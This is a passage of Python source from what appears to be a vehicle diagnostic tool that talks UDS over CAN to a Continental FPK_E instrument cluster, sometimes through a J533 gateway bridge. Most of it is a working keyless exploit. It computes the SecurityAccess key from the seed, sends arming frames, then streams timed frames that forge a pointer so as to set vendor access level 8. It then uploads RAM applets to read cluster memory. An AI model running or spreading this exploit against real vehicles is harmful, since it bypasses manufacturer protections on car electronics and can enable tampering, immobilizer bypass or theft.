    def request_uds(
        self,
        uds_payload: bytes,
        expected_sid: int | None = None,
        *,
        timeout: float = 2.0,
        allow_pending: bool = True,
    ) -> bytes:
        """Send UDS request on `0x714` and return validated response from `0x77E`, waiting through NRC `0x78`."""
        req = bytes(uds_payload)
        if not req:
            raise ValueError("Empty UDS payload")
        req_sid = req[0]
        if expected_sid is None:
            expected_sid = (req_sid + 0x40) & 0xFF
        self.drain_rx(quick=True)
        self.send_uds(req)
        deadline = time.monotonic() + timeout
        wait = max(timeout, 2.5)
        while True:
            rem = deadline - time.monotonic()
            if rem <= 0:
                raise TimeoutError(f"UDS response timeout ({timeout:.1f}s) for {req[:8].hex()}")
            resp = self.receive_uds(timeout=min(wait, rem))
            if (
                allow_pending
                and len(resp) >= 3
                and resp[0] == 0x7F
                and resp[1] == req_sid
                and resp[2] == 0x78
            ):
                deadline = max(deadline, time.monotonic() + P2_STAR_WAIT)
                wait = P2_STAR_WAIT
                continue
            return _checked_response(req_sid, resp, expected_sid)


# ────────────────────────────── Active Session Registry ──────────────────────────────

_ACTIVE_LINK_LOCK = threading.Lock()
_ACTIVE_LINK: FpkeCanLink | None = None


def get_active_fpke_link(port: str | None = None, interface: str | None = None) -> FpkeCanLink | None:
    """Return the currently open `FpkeCanLink` if it is alive (and matches `port`/`interface` when specified)."""
    with _ACTIVE_LINK_LOCK:
        link = _ACTIVE_LINK
        if link is None or link.is_closed:
            return None
        if port is not None and link.port != port:
            return None
        if interface is not None and link.interface != interface:
            return None
        return link


def set_active_fpke_link(link: FpkeCanLink | None) -> None:
    """Register `link` as the active persistent FPK_E CAN session link, closing any previous link."""
    global _ACTIVE_LINK
    with _ACTIVE_LINK_LOCK:
        old = _ACTIVE_LINK
        _ACTIVE_LINK = link
    if old is not None and old is not link and not old.is_closed:
        old.close()


def close_active_fpke_link() -> None:
    """Close and clear the active persistent FPK_E CAN session link."""
    set_active_fpke_link(None)


def open_or_reuse_fpke_link(
    port: str,
    *,
    interface: str = "slcan",
    log_path: Path | None = None,
    bus: Any | None = None,
    via_gateway: bool = False,
) -> FpkeCanLink:
    """Reuse the open `FpkeCanLink` for `(port, interface, via_gateway)` if available, or open a new persistent link."""
    global _ACTIVE_LINK
    with _ACTIVE_LINK_LOCK:
        cur = _ACTIVE_LINK
        if (
            cur is not None
            and not cur.is_closed
            and cur.port == port
            and cur.interface == interface
            and cur.via_gateway == bool(via_gateway)
            and (bus is None or cur.bus is bus)
        ):
            if log_path is not None:
                cur.attach_log(log_path)
            return cur
        _ACTIVE_LINK = None
    if cur is not None and not cur.is_closed:
        cur.close()
    new_link = FpkeCanLink(port, interface=interface, log_path=log_path, bus=bus, via_gateway=via_gateway)
    superseded: FpkeCanLink | None = None
    with _ACTIVE_LINK_LOCK:
        superseded = _ACTIVE_LINK
        _ACTIVE_LINK = new_link
    if superseded is not None and superseded is not new_link and not superseded.is_closed:
        with contextlib.suppress(Exception):
            superseded.close()
    return new_link


@contextlib.contextmanager
def _managed_fpke_link(
    port: str,
    *,
    interface: str = "slcan",
    log_path: Path | None = None,
    bus: Any | None = None,
    keep_open: bool = False,
    via_gateway: bool = False,
) -> Iterator[FpkeCanLink]:
    """Yield an `FpkeCanLink`, keeping it open on exit when `keep_open=True` or when reusing an active session."""
    active = get_active_fpke_link(port, interface)
    reused = (
        active is not None
        and active.via_gateway == bool(via_gateway)
        and (bus is None or getattr(active, "bus", None) is bus)
    )
    if keep_open or reused:
        yield open_or_reuse_fpke_link(port, interface=interface, log_path=log_path, bus=bus, via_gateway=via_gateway)
    else:
        with FpkeCanLink(port, interface=interface, log_path=log_path, bus=bus, via_gateway=via_gateway) as link:
            yield link


@contextlib.contextmanager
def _managed_fpke_session(
    port: str,
    *,
    interface: str = "slcan",
    log_path: Path | None = None,
    bus: Any | None = None,
    keep_open: bool = False,
    via_gateway: bool = False,
    gateway_bridge: bool = False,
    gateway_channel: int = 0,
    needs_level8: bool = True,
    reporter: OperationReporter = NULL_REPORTER,
) -> Iterator[tuple[FpkeCanLink, bool]]:
    """Open an FPK_E CAN session over either direct CAN or a J533 gateway (with automatic Level-2 RAM-Bridge).

    Yields `(link, bridged)`:
      - `via_gateway=False`: behaves identically to `_managed_fpke_link` (`bridged=False`).
      - `via_gateway=True, needs_level8=False`: pure UDS `0x714/0x77E` through the gateway (`bridged=False`).
      - `via_gateway=True, needs_level8=True`: first checks if vendor level 8 is already open over normal UDS
        through the gateway; if so, runs directly over UDS without disrupting the gateway (`bridged=False`).
        Otherwise, enters `J533CanBridge` (`ch3 Diag CAN ↔ ch{gateway_channel}`) so 29-bit `0x1BFCA2xx`/`0x17FA0E14`
        pass transparently, runs the operation, and resets J533 cleanly back to Application on exit (`bridged=True`).
    """
    if not via_gateway:
        with _managed_fpke_link(
            port,
            interface=interface,
            log_path=log_path,
            bus=bus,
            keep_open=keep_open,
            via_gateway=False,
        ) as link:
            yield link, False
        return

    if not needs_level8:
        with _managed_fpke_link(
            port,
            interface=interface,
            log_path=log_path,
            bus=bus,
            keep_open=keep_open,
            via_gateway=True,
        ) as link:
            yield link, False
        return

    # Probe whether vendor level 8 is already active over normal J533 UDS before disrupting the gateway
    close_active_fpke_link()
    probe = FpkeCanLink(port, interface=interface, log_path=log_path, bus=bus, via_gateway=True)
    already_l8 = False
    try:
        already_l8 = fpke_check_level8(probe, timeout=0.6) is not None
    except Exception:
        already_l8 = False
    if already_l8:
        reporter.info(
            tr(
                "Уровень доступа 8 уже открыт — работаем напрямую по UDS через шлюз J533 без запуска моста.",
                "Vendor level 8 is already active — running directly over J533 UDS without starting the bridge.",
            )
        )
        try:
            yield probe, False
        finally:
            probe.close()
        return

    # A VAS 6154 sends one frame per 3-7 ms, too slow for the level-8 stream: the gateway sends it instead, so the
    # table (which depends on the firmware profile) goes into its RAM with the bridge applet. It is built only for
    # the profile the cluster reports itself: a guessed one forges the wrong pointer into its RAM.
    gateway_sends_stream = gateway_bridge and bus is None and interface not in FPKE_NATIVE_INTERFACES
    burst_profile = _read_sw_profile(probe) if gateway_sends_stream else None
    probe.close()
    if gateway_sends_stream and burst_profile is None:
        raise RuntimeError(
            tr(
                "Панель приборов не сообщила версию ПО (нет ответа на UDS 22 F189 / F187), а без неё шлюзу J533 "
                "нельзя загрузить поток уровня 8. Включите зажигание (KL15), дождитесь, пока панель проснётся, "
                "и повторите.",
                "The instrument cluster did not report its software version (no answer to UDS 22 F189 / F187), "
                "and the J533 gateway cannot be given the level-8 stream without it. Switch the ignition (KL15) "
                "on, wait for the cluster to wake up, and retry.",
            )
        )
    if not gateway_bridge:
        raise RuntimeError(
            tr(
                "Для доступа уровня 8 к памяти панели приборов FPK_E через шлюз требуется шлюз "
                "Continental 3Q0 907 530 и адаптер с произвольным raw CAN (CANable / SLCAN / candleLight или "
                "VNCI, принимающий в RawMode все идентификаторы) для запуска прозрачного RAM-моста — либо прямое "
                "подключение к CAN панели приборов (T18).",
                "Keyless level-8 access to an FPK_E instrument cluster through a gateway requires a Continental "
                "3Q0 907 530 gateway and an adapter with arbitrary raw CAN (CANable / SLCAN / candleLight, or a "
                "VNCI whose RawMode receives every identifier) for the transparent RAM bridge — or a direct "
                "connection to the cluster CAN bus (T18).",
            )
        )

    from contitool.can.bridge import j533_can_bridge

    fpke_rx_filter = (
        (FPKE_UDS_RX_ID, False),
        (FPKE_STREAM_RX_ID, False),
        (FPKE_ARM_RESPONSE_ID, True),
        (FPKE_CF_CH9_ID, True),
    )
    with j533_can_bridge(
        port,
        interface=interface,
        target_channel=gateway_channel,
        log_path=None,
        bus=bus,
        burst_frames=fpke_level8_frames(burst_profile) if burst_profile else None,
        target_rx_filter=fpke_rx_filter,
        reporter=reporter,
    ) as bridge:
        with FpkeCanLink(
            port,
            interface=interface,
            log_path=log_path,
            bus=bridge.bus,
            via_gateway=False,
            sw_profile=burst_profile,
        ) as br_link:
            if burst_profile:
                br_link.gateway_burst = bridge.fire_burst
                br_link.gateway_burst_profile = burst_profile
            yield br_link, True


def can_fpke_run_level8_action(
    port: str,
    action: Any,
    *,
    interface: str = "slcan",
    via_gateway: bool = False,
    gateway_bridge: bool = False,
    gateway_channel: int = 0,
    keep_open: bool = True,
    bus: Any | None = None,
    reporter: OperationReporter = NULL_REPORTER,
) -> Any:
    """Run an FPK_E callback `action(link)` or `action(link, reporter)` that requires vendor level 8."""
    accepts_reporter = False
    try:
        sig = inspect.signature(action)
        pos_params = [
            p
            for p in sig.parameters.values()
            if p.kind in (inspect.Parameter.POSITIONAL_ONLY, inspect.Parameter.POSITIONAL_OR_KEYWORD)
        ]
        has_varargs = any(p.kind == inspect.Parameter.VAR_POSITIONAL for p in sig.parameters.values())
        accepts_reporter = has_varargs or len(pos_params) >= 2
    except (TypeError, ValueError):
        accepts_reporter = False

    with _managed_fpke_session(
        port,
        interface=interface,
        bus=bus,
        keep_open=keep_open and not via_gateway,
        via_gateway=via_gateway,
        gateway_bridge=gateway_bridge,
        gateway_channel=gateway_channel,
        needs_level8=True,
        reporter=reporter,
    ) as (link, _bridged):
        if accepts_reporter:
            return action(link, reporter)
        return action(link)


# ────────────────────────────── Protocol Primitives (Level 8, FD11, 0x23, 0x3D) ──────────────────────────────


def fpke_read_memory_0x23(link: FpkeCanLink, address: int, size: int, *, timeout: float = 4.0) -> bytes:
    """Read `size` bytes at `address` via UDS `23 44 <addr:4BE> <size:4BE>`, verifying SID `0x63` and exact length."""
    req = b"\x23\x44" + address.to_bytes(4, "big") + size.to_bytes(4, "big")
    resp = link.request_uds(req, 0x63, timeout=timeout)
    data = resp[1:]
    if len(data) != size:
        raise RuntimeError(f"Short UDS 0x23 memory read at 0x{address:08X}: got {len(data)} != {size} bytes")
    return data


def fpke_write_memory_0x3d(link: FpkeCanLink, address: int, data: bytes, *, timeout: float = 6.0) -> None:
    """Write `data` to RAM `address` via UDS `3D 44 <addr:4BE> <len:4BE> <data>`."""
    req = b"\x3d\x44" + address.to_bytes(4, "big") + len(data).to_bytes(4, "big") + bytes(data)
    link.request_uds(req, 0x7D, timeout=timeout)


def fpke_idauth(link: FpkeCanLink, idcode_16b: bytes) -> bytes:
    """Write 16-byte candidate `idcode_16b` to `IDAUTH` (`0xFFA08000`), perform mandatory `SELFID3` dummy read, and return `IDST`."""
    if len(idcode_16b) != 16:
        raise ValueError(f"RH850 IDCODE must be 16 bytes, got {len(idcode_16b)}")
    fpke_write_memory_0x3d(link, IDAUTH_ADDR, idcode_16b)
    fpke_read_memory_0x23(link, IDAUTH_ADDR + 0x0C, 4)  # mandatory dummy read of SELFID3 (0xFFA0800C)
    return fpke_read_memory_0x23(link, IDST_ADDR, 4)


def _resolve_link_profile(link: FpkeCanLink) -> dict[str, Any]:
    """Return the active `FPKE_PROFILES` entry for `link` (defaulting to `'83a'`)."""
    return fpke_get_profile(getattr(link, "sw_profile", None) or "83a")


def _probe_link_sw_profile(link: FpkeCanLink, *, force: bool = False) -> str:
    """Detect `link.sw_profile` (`'83a'`, `'1703'`, or `'1711'`) via UDS `22 F189` / `22 F187`."""
    explicit = getattr(link, "_explicit_sw_profile", None)
    if explicit in FPKE_PROFILES:
        link.sw_profile = str(explicit)
        return str(explicit)
    cur = getattr(link, "sw_profile", None)
    if not force and cur in FPKE_PROFILES:
        return str(cur)
    detected = _read_sw_profile(link)
    if detected:
        if detected != cur:
            link._stack_profile_verified = False
        link.sw_profile = detected
        return detected
    if cur in FPKE_PROFILES:
        return str(cur)
    link.sw_profile = "83a"
    return "83a"


def _read_sw_profile(link: FpkeCanLink) -> str | None:
    """The profile the cluster reports itself in UDS `22 F189` / `22 F187`, or None when it answers neither."""
    f189_str = ""
    f187_str = ""
    with contextlib.suppress(Exception):
        r89 = link.request_uds(b"\x22\xf1\x89", 0x62, timeout=0.8)
        f189_str = r89[3:].decode("latin1", errors="ignore").strip("\x00 ")
    with contextlib.suppress(Exception):
        r87 = link.request_uds(b"\x22\xf1\x87", 0x62, timeout=0.8)
        f187_str = r87[3:].decode("latin1", errors="ignore").strip("\x00 ")
    if f189_str or f187_str:
        return fpke_detect_sw_profile(f189=f189_str, f187=f187_str)
    return None


def _refine_link_profile_from_stack(link: FpkeCanLink, *, force: bool = False) -> dict[str, Any]:
    """Refine `link.sw_profile` (`'83a'` vs `'1703'` vs `'1711'`) from the live `0x23`/`0x3D` stack return word."""
    cur = getattr(link, "sw_profile", None)
    if not force and getattr(link, "_stack_profile_verified", False) and cur in FPKE_PROFILES:
        return _resolve_link_profile(link)
    if cur in ("1703", "1711"):
        with contextlib.suppress(Exception):
            ret_17 = fpke_read_memory_0x23(link, FPKE_1703_SAVED_RETURN, 4, timeout=1.0)
            if ret_17 == FPKE_1711_CALLER_RETURN.to_bytes(4, "little"):
                link.sw_profile = "1711"
                link._stack_profile_verified = True
                return _resolve_link_profile(link)
            if ret_17 == FPKE_1703_CALLER_RETURN.to_bytes(4, "little"):
                link.sw_profile = "1703"
                link._stack_profile_verified = True
                return _resolve_link_profile(link)
    with contextlib.suppress(Exception):
        ret_83a = fpke_read_memory_0x23(link, FPKE_SAVED_RETURN, 4, timeout=1.0)
        if ret_83a == FPKE_CALLER_RETURN.to_bytes(4, "little"):
            link.sw_profile = "83a"
            link._stack_profile_verified = True
            return _resolve_link_profile(link)
    with contextlib.suppress(Exception):
        ret_17 = fpke_read_memory_0x23(link, FPKE_1703_SAVED_RETURN, 4, timeout=1.0)
        if ret_17 == FPKE_1711_CALLER_RETURN.to_bytes(4, "little"):
            link.sw_profile = "1711"
            link._stack_profile_verified = True
        elif ret_17 == FPKE_1703_CALLER_RETURN.to_bytes(4, "little"):
            link.sw_profile = "1703"
            link._stack_profile_verified = True
    return _resolve_link_profile(link)


def fpke_verify_level8_control(link: FpkeCanLink) -> bytes:
    """Enter `10 03 -> 10 60` and verify `CFlash[0:16]` starts with `80 07 F0 10`."""
    link.request_uds(b"\x10\x03", 0x50, timeout=2.0)
    link.request_uds(b"\x10\x60", 0x50, timeout=2.0)
    cflash_16 = fpke_read_memory_0x23(link, FPKE_CFLASH_ADDR, 16)
    if cflash_16[:4] != FPKE_CFLASH_CONTROL_PREFIX:
        link.level8_active = False
        raise RuntimeError(
            tr(
                f"Уровень доступа поставщика 8 не установлен: контрольное чтение CFlash вернуло {cflash_16.hex()} "
                "(ожидался префикс 80 07 F0 10).",
                f"Vendor level 8 was not established: CFlash control read returned {cflash_16.hex()} "
                "(expected prefix 80 07 F0 10).",
            )
        )
    link.level8_active = True
    _refine_link_profile_from_stack(link, force=True)
    return cflash_16


def fpke_check_level8(link: FpkeCanLink, *, timeout: float = 0.8) -> bytes | None:
    """Probe whether vendor level 8 is already active in the current session (`10 03 -> 10 60 -> 23 44 00000000 00000010`)."""
    try:
        link.request_uds(b"\x10\x03", 0x50, timeout=timeout)
        if getattr(link, "sw_profile", None) is None:
            _probe_link_sw_profile(link)
        link.request_uds(b"\x10\x60", 0x50, timeout=timeout)
        cflash_16 = fpke_read_memory_0x23(link, FPKE_CFLASH_ADDR, 16, timeout=timeout)
        if cflash_16[:4] == FPKE_CFLASH_CONTROL_PREFIX:
            link.level8_active = True
            _refine_link_profile_from_stack(link)
            return cflash_16
    except Exception:
        pass
    link.level8_active = False
    return None


def fpke_ensure_level8(
    link: FpkeCanLink,
    *,
    frame_delay: float = FPKE_DEFAULT_FRAME_DELAY,
    wake_seconds: float = 4.0,
    post_exploit_sleep: float = 1.0,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Check if vendor level 8 is already active on `link`; if not, establish vendor level 8 over CAN."""
    verify_fpke_self_tests()
    link.start_keepalive()
    cflash_16 = fpke_check_level8(link)
    if cflash_16 is not None:
        prof = _resolve_link_profile(link)
        reporter.can_log(
            tr(
                f"Уровень доступа 8 уже активен в открытой сессии (CFlash[0:16] = {cflash_16[:4].hex(' ').upper()} …)",
                f"Vendor level 8 is already active in the open session (CFlash[0:16] = {cflash_16[:4].hex(' ').upper()} …)",
            )
        )
        reporter.info(tr("Уровень доступа 8 подтверждён в открытой сессии", "Vendor level 8 confirmed in open session"))
        return {
            "sw_profile": prof["name"],
            "vendor_level": FPKE_REQUIRED_LEVEL,
            "reused_session": True,
            "stream_elapsed_s": 0.0,
            "cflash_first_16": cflash_16.hex(),
        }
    return fpke_establish_level8(
        link,
        frame_delay=frame_delay,
        wake_seconds=wake_seconds,
        post_exploit_sleep=post_exploit_sleep,
        reporter=reporter,
    )


def fpke_establish_level8(
    link: FpkeCanLink,
    *,
    frame_delay: float = FPKE_DEFAULT_FRAME_DELAY,
    wake_seconds: float = 4.0,
    post_exploit_sleep: float = 1.0,
    reporter: OperationReporter = NULL_REPORTER,
) -> dict[str, Any]:
    """Execute the complete keyless CAN sequence to establish vendor level 8 on FPK_E (SW 83A, 1703, or 1711).

    1. Starts keepalive (`0x3C0`, `0x663`, `0x585`, `0x3BE`) and wakes the cluster for `wake_seconds` (4 s).
    2. `10 03` -> auto-detects `sw_profile` (`83a` vs `1703`/`1711`) -> `27 03` -> `27 04 <(BE32(seed) + 0xB80B) mod 2^32>` -> `2E F198 01..06` -> `2E 0514 01` -> `3E 00`.
    3. Sends 3 EC arming frames on `0x1BFCA2EC` (100 ms apart) and waits for `0x1BFCA2EE = 14 02`.
    4. Stops keepalive and transmits paced frames (`0.35 ms`/frame):
       `ED[0..pointer_frame-1]` + `17FA0E14 FF` + `ED[pointer_frame]` (`forged_ptr`) + `17FA0E14 CF` (`[level_addr] = 8`).
    5. Waits `post_exploit_sleep` (1 s), restarts keepalive, enters `10 03 -> 10 60`, and verifies `CFlash[0:16]`.
    """
    verify_fpke_self_tests()
    link.start_keepalive()
    if wake_seconds > 0:
        reporter.can_log(
            tr(
                f"Имитация сети CAN (3C0/663/585/3BE) и пробуждение панели приборов ({wake_seconds:.1f} с)…",
                f"Starting CAN network keepalive (3C0/663/585/3BE) and waking cluster ({wake_seconds:.1f} s)…",
            )
        )
        end_wake = time.monotonic() + wake_seconds
        while time.monotonic() < end_wake:
            reporter.check_cancelled()
            time.sleep(min(0.1, max(0.01, end_wake - time.monotonic())))

    reporter.can_log(tr("UDS 10 03 + SecurityAccess 27 03/04 (+0xB80B) + DID 0514 arming", "UDS 10 03 + SecurityAccess 27 03/04 (+0xB80B) + DID 0514 arming"))
    link.request_uds(b"\x10\x03", 0x50, timeout=2.0)
    link._stack_profile_verified = False
    if link.gateway_burst is not None:
        # The gateway holds the stream for one profile: the cluster answering now must report that same one
        want = str(link.gateway_burst_profile).upper()
        live = _read_sw_profile(link)
        if live != link.gateway_burst_profile:
            raise RuntimeError(
                tr(
                    f"Поток уровня 8 не отправлен: шлюз J533 загружен потоком для ПО панели {want}, а панель "
                    f"сейчас отвечает на UDS 22 F189 / F187: {live.upper() if live else 'нет ответа'}. "
                    "Повторите операцию.",
                    f"The level-8 stream was not sent: the J533 gateway holds the stream for cluster software "
                    f"{want}, but the cluster now answers UDS 22 F189 / F187 with: "
                    f"{live.upper() if live else 'no answer'}. Retry the operation.",
                )
            )
    elif getattr(link, "_explicit_sw_profile", None) is None:
        _probe_link_sw_profile(link, force=True)
    prof = _resolve_link_profile(link)
    prof_name = str(prof["name"])
    ptr_frame = int(prof["pointer_frame"])
    total_burst_frames = ptr_frame + 3

    seed_resp = link.request_uds(b"\x27\x03", 0x67, timeout=2.0)
    if len(seed_resp) != 6:
        raise RuntimeError(f"Unexpected SecurityAccess 27 03 response: {seed_resp.hex()}")
    seed_int = int.from_bytes(seed_resp[2:6], "big")
    key_bytes = ((seed_int + 0xB80B) & 0xFFFFFFFF).to_bytes(4, "big")
    link.request_uds(b"\x27\x04" + key_bytes, 0x67, timeout=2.0)
    link.request_uds(bytes.fromhex("2ef198010203040506"), 0x6E, timeout=2.0)
    link.request_uds(bytes.fromhex("2e051401"), 0x6E, timeout=4.0, allow_pending=True)
    link.request_uds(b"\x3e\x00", 0x7E, timeout=2.0)

    link.drain_rx(quick=True)
    for idx, payload in enumerate(FPKE_ARM_FRAMES):
        link.send_frame(FPKE_ARM_ID, payload, extended=True)
        if idx + 1 < len(FPKE_ARM_FRAMES):
            time.sleep(0.1)

    arm_deadline = time.monotonic() + 2.0
    armed = False
    while time.monotonic() < arm_deadline:
        rem = arm_deadline - time.monotonic()
        try:
            msg = link.receive_frame(FPKE_ARM_RESPONSE_ID, extended=True, timeout=rem)
        except TimeoutError:
            break
        raw = bytes(msg.data)
        if raw[:2] == b"\x14\x02":
            armed = True
            break
        if raw[:2] == b"\x14\xef":
            raise RuntimeError(
                tr(
                    f"Панель приборов отклонила EC arming на 0x1BFCA2EE ({raw.hex(' ').upper()}).",
                    f"Cluster rejected EC arming on 0x1BFCA2EE ({raw.hex(' ').upper()}).",
                )
            )
    if not armed:
        raise RuntimeError(
            tr(
                "Не получен ответ готовности EC arming (0x1BFCA2EE = 14 02). Проверьте питание панели приборов и шину CAN.",
                "EC arming readiness (0x1BFCA2EE = 14 02) was not received. Check cluster power and CAN bus.",
            )
        )
    reporter.can_log(
        tr(
            f"EC arming подтверждён (0x1BFCA2EE = 14 02, профиль {prof_name.upper()}) — отправка {total_burst_frames} кадров потока…",
            f"EC arming confirmed (0x1BFCA2EE = 14 02, profile {prof_name.upper()}) — sending {total_burst_frames}-frame stream…",
        )
    )

    frames = fpke_level8_frames(prof_name)
    link.stop_keepalive()
    t_start = time.monotonic()
    if link.gateway_burst is not None:
        link.gateway_burst(frames)  # the J533 bridge sends them itself: a VAS 6154 cannot keep this pace
    else:
        next_frame = time.perf_counter()
        for arb_id, frame_bytes in frames:
            link.send_frame(arb_id, frame_bytes, extended=True)
            if frame_delay > 0:
                next_frame += frame_delay
                delay = next_frame - time.perf_counter()
                if delay > 0:
                    time.sleep(delay)
    stream_elapsed = round(time.monotonic() - t_start, 3)

    if post_exploit_sleep > 0:
        time.sleep(post_exploit_sleep)
    link.start_keepalive()

    cflash_control = fpke_verify_level8_control(link)
    prof = _resolve_link_profile(link)
    reporter.can_log(
        tr(
            f"Vendor level 8 установлен за {stream_elapsed:.3f} с (CFlash[0:16] = {cflash_control[:4].hex(' ').upper()} …)",
            f"Vendor level 8 established in {stream_elapsed:.3f} s (CFlash[0:16] = {cflash_control[:4].hex(' ').upper()} …)",
        )
    )
    reporter.info(tr("Сессия чтения по CAN открыта", "CAN read session established"))
    return {
        "sw_profile": prof["name"],
        "block_buffer": f"0x{prof['block_buffer']:08X}",
        "cantp_channel": prof["cantp_channel"],
        "cantp_pointer": f"0x{prof['cantp_ptr']:08X}",
        "pointer_frame": prof["pointer_frame"],
        "forged_pointer": f"0x{prof['forged_ptr']:08X}",
        "level_address": f"0x{prof['level_address']:08X}",
        "vendor_level": FPKE_REQUIRED_LEVEL,
        "template_sha256": prof["template_sha256"],
        "stream_elapsed_s": stream_elapsed,
        "cflash_first_16": cflash_control.hex(),
    }


def fpke_authenticate_fd11(
    link: FpkeCanLink,
    key_16b: bytes,
    *,
    expected_id_hex: str | None = None,
    reporter: OperationReporter = NULL_REPORTER,
) -> str:
    """Authenticate vendor level 6 via standard `2E FD11 03 / 04 / 06` using a known 16-byte AES-128 key."""
    if len(key_16b) != 16:
        raise ValueError("FD11 key must contain exactly 16 bytes")
    t16 = bytes(range(16))
    t8 = bytes(range(0x10, 0x18))
    link.request_uds(b"\x10\x60", 0x50, timeout=4.0)
    challenge = link.request_uds(b"\x2e\xfd\x11\x03" + t16 + t8 + b"\x06", 0x6E, timeout=4.0)
    if len(challenge) != 26 or challenge[:3] != b"\x6e\xfd\x11":
        raise RuntimeError(f"Unexpected FD11 challenge response: {challenge.hex()}")
    identifier = challenge[11:26].hex()
    if expected_id_hex is not None and identifier.lower() != expected_id_hex.lower():
        raise RuntimeError(f"FD11 challenge identifier mismatch: {identifier} != {expected_id_hex}")
    proof = build_fd11_proof(challenge, key_16b, t16=t16, t8=t8)
    resp04 = link.request_uds(b"\x2e\xfd\x11\x04" + proof, 0x6E, timeout=4.0)
    if resp04 != b"\x6e\xfd\x11":
        raise RuntimeError(f"FD11 04 rejected: {resp04.hex()}")
    resp06 = link.request_uds(b"\x2e\xfd\x11\x06", 0x6E, timeout=4.0)
    if len(resp06) == 39 and resp06[:3] == b"\x6e\xfd\x11":
        crc_calc = struct.pack("<I", zlib.crc32(resp06[3:-4]) & 0xFFFFFFFF)
        if crc_calc != resp06[-4:]:
            raise RuntimeError("FD11 06 response CRC-32 mismatch")
    elif resp06 != b"\x6e\xfd\x11":
        raise RuntimeError(f"FD11 06 rejected: {resp06.hex()}")
    reporter.success(tr("Штатная авторизация FD11 (vendor level 6) подтверждена", "Standard FD11 authentication (vendor level 6) confirmed"))
    return identifier


# ────────────────────────────── Memory Readers (Fast Stream + UDS 0x23 / Applet Fallback) ──────────────────────────────


@contextlib.contextmanager
def _applet_ram_guard(
    link: FpkeCanLink,
    payload: bytes,
    *,
    param_size: int = 4,
    save_result: bool = True,
    check_bfaselr: bool = False,
) -> Iterator[dict[str, Any]]:
    """Save SX RAM (`applet_entry`, `source_param`, `result_addr`), upload `payload`, and guarantee RAM restoration."""
    prof = _resolve_link_profile(link)
    app_entry = int(prof["applet_entry"])
    src_param = int(prof["source_param"])
    res_addr = int(prof["result_addr"])
    mark_addr = int(prof["marker_addr"])
    saved_ret_addr = int(prof["saved_return"])
    exp_caller_ret = int(prof["caller_return"]).to_bytes(4, "little")

    orig_entry = fpke_read_memory_0x23(link, app_entry, len(payload))
    orig_param = fpke_read_memory_0x23(link, src_param, param_size)
    orig_result = (
        fpke_read_memory_0x23(link, res_addr, FPKE_RESULT_SIZE)
        if save_result
        else fpke_read_memory_0x23(link, mark_addr, 32)
    )
    saved_return = fpke_read_memory_0x23(link, saved_ret_addr, 4)
    if saved_return != exp_caller_ret and prof["name"] in ("1703", "1711"):
        if saved_return == FPKE_1711_CALLER_RETURN.to_bytes(4, "little"):
            link.sw_profile = "1711"
            prof = _resolve_link_profile(link)
            exp_caller_ret = int(prof["caller_return"]).to_bytes(4, "little")
        elif saved_return == FPKE_1703_CALLER_RETURN.to_bytes(4, "little"):
            link.sw_profile = "1703"
            prof = _resolve_link_profile(link)
            exp_caller_ret = int(prof["caller_return"]).to_bytes(4, "little")
    if saved_return != exp_caller_ret:
        raise RuntimeError(
            f"Unexpected saved return at 0x{saved_ret_addr:08X}: {saved_return.hex()} "
            f"(expected {exp_caller_ret.hex()})"
        )
    if check_bfaselr:
        init_bfaselr = fpke_read_memory_0x23(link, BFASELR_ADDR, 1)
        if init_bfaselr != b"\x00":
            raise RuntimeError(f"Unexpected initial BFASELR: {init_bfaselr.hex()}")

    fpke_write_memory_0x3d(link, app_entry, payload)
    state: dict[str, Any] = {"ram_restored": False}
    try:
        yield state
    finally:
        with contextlib.suppress(Exception):
            fpke_write_memory_0x3d(link, app_entry, orig_entry)
            fpke_write_memory_0x3d(link, src_param, orig_param)
            if save_result:
                fpke_write_memory_0x3d(link, res_addr, orig_result)
            else:
                fpke_write_memory_0x3d(link, mark_addr, orig_result)
            restored = (
                fpke_read_memory_0x23(link, app_entry, len(payload)) == orig_entry
                and fpke_read_memory_0x23(link, src_param, param_size) == orig_param
                and (
                    fpke_read_memory_0x23(link, res_addr, FPKE_RESULT_SIZE) == orig_result
                    if save_result
                    else fpke_read_memory_0x23(link, mark_addr, 32) == orig_result
                )
                and (not check_bfaselr or fpke_read_memory_0x23(link, BFASELR_ADDR, 1) == b"\x00")
            )
            state["ram_restored"] = restored


def _stream_chunk_via_rscan(
    link: FpkeCanLink,
    address: int,
    size: int,
    *,
    frame_timeout: float = 1.2,
    stream_state: dict[str, int] | None = None,
    pause_keepalive: bool = True,
) -> bytes:
    """Trigger the uploaded SX RAM RSCAN0 `TM17` streaming applet for `size` bytes (multiple of 8) and collect `0x6F1` frames."""
    if size <= 0 or size % 8 != 0:
        raise ValueError(f"Stream chunk size must be a positive multiple of 8, got {size}")
    prof = _resolve_link_profile(link)
    app_entry = int(prof["applet_entry"])
    src_param = int(prof["source_param"])
    saved_ret_addr = int(prof["saved_return"])
    frames_needed = size // 8
    addr_u32 = address & 0xFFFFFFFF
    if (
        stream_state is None
        or stream_state.get("next_addr") != addr_u32
        or stream_state.get("frames") != frames_needed
    ):
        fpke_write_memory_0x3d(link, src_param, struct.pack("<II", addr_u32, frames_needed))
    trigger_req = (
        b"\x3d\x44"
        + saved_ret_addr.to_bytes(4, "big")
        + (4).to_bytes(4, "big")
        + app_entry.to_bytes(4, "little")
    )
    collected = bytearray()
    rx_count = 0
    ka_ctx = link.paused_keepalive() if pause_keepalive else contextlib.nullcontext()
    with ka_ctx:
        link.drain_rx(quick=True)
        link.send_uds(trigger_req)
        deadline = time.monotonic() + max(1.5, frames_needed * 0.005 + frame_timeout)
        got_7d = False
        with link.suspend_rx_trace():
            while (len(collected) < size or not got_7d) and time.monotonic() < deadline:
                wait_s = min(frame_timeout, max(0.02, deadline - time.monotonic()))
                msg = link.receive_frame(timeout=wait_s)
                if msg.is_extended_id:
                    continue
                raw = bytes(msg.data)
                if msg.arbitration_id == link.STREAM_RX_ID and len(collected) < size:
                    if len(raw) != 8:
                        raise TimeoutError(
                            f"Short 0x{link.STREAM_RX_ID:03X} frame at 0x{address:08X}: {len(raw)} bytes"
                        )
                    collected.extend(raw)
                    rx_count += 1
                elif msg.arbitration_id == link.UDS_RX_ID and raw:
                    pci_type = raw[0] >> 4
                    if pci_type == 0:
                        sf_len = raw[0] & 0x0F
                        uds_reply = raw[1 : 1 + sf_len]
                        if uds_reply[:1] == b"\x7d":
                            got_7d = True
                            if len(collected) >= size:
                                break
                            deadline = min(deadline, time.monotonic() + 0.08)
                        elif len(uds_reply) >= 3 and uds_reply[0] == 0x7F and uds_reply[2] == 0x78:
                            continue
                        elif uds_reply[:1] == b"\x7f":
